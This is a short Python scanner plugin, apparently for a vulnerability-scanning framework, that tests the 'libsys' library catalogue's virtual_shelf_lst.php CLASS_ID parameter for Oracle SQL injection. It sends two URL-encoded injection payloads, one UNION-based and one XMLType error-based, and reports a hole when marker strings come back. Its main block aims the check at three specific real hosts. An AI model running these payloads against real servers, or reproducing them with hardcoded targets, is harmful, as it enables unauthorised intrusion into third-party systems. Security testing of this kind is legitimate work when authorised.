#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0129800

import re

def assign(service, arg):
    if service == "libsys":
        return True, arg

def audit(arg):
    payload = 'opac/virtual_shelf_lst.php?CLASS_ID=1'
    getdata = '%27%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28103%29%7C%7CCHR%28121%29%7C%7CCHR%2890%29%7C%7CCHR%28122%29%7C%7CCHR%28117%29%7C%7CCHR%2885%29%7C%7CCHR%2884%29%7C%7CCHR%28121%29%7C%7CCHR%2888%29%7C%7CCHR%2868%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--'
    code, head, res, errcode, _ = curl.curl2(arg + payload + getdata)
    if code == 200 and 'qzkqqgyZzuUTyXDqkvvq' in res :
        security_hole(arg + payload + '  :found sql Injection')
        return
        
    getdata = '%27%20AND%206565%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286565%3D6565%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27KxlF%27%3D%27KxlF'
    code, head, res, errcode, _ = curl.curl2(arg + payload + getdata)
    if code == 200 and 'qqzkq1qkzvq' in res :
        security_hole(arg + payload + '  :found sql Injection')
                
            
    
            
    


if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys', 'http://202.119.108.28/')[1])
    audit(assign('libsys', 'http://221.226.44.228/')[1])
    audit(assign('libsys', 'http://lib1.sdx.js.cn:88/')[1])